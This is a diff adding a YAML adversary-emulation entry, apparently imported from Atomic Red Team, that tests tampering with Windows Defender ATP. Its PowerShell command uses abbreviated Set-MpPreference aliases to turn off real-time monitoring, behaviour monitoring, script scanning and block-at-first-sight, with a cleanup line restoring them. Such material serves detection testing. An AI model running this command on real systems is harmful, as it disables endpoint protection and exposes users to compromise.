@@ -1,0 +1,33 @@
+- id: c531aa6e-9c97-4b29-afee-9b7be6fc8a64
+  name: Tamper with Windows Defender ATP using Aliases - PowerShell
+  description: 'Attempting to disable scheduled scanning and other parts of Windows
+    Defender ATP using set-MpPreference aliases. Upon execution Virus and Threat Protection
+    will show as disabled
+
+    in Windows settings.'
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685
+    name: Disable or Modify Tools
+  platforms:
+    windows:
+      psh:
+        command: Set-MpPreference -drtm $True; Set-MpPreference -dbm $True; Set-MpPreference
+          -dscrptsc $True; Set-MpPreference -dbaf $True
+        cleanup: Set-MpPreference -drtm 0; Set-MpPreference -dbm 0; Set-MpPreference
+          -dscrptsc 0; Set-MpPreference -dbaf 0
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - atomic-red-team
+  - t1685
+  - defense-impairment
+  author: Atomic Red Team
+  additional_info:
+    technique_created: '2026-04-14T22:53:26.949Z'
+    atomic_guid: c531aa6e-9c97-4b29-afee-9b7be6fc8a64
+    import_timestamp: '2026-05-02T05:00:41.587847Z'
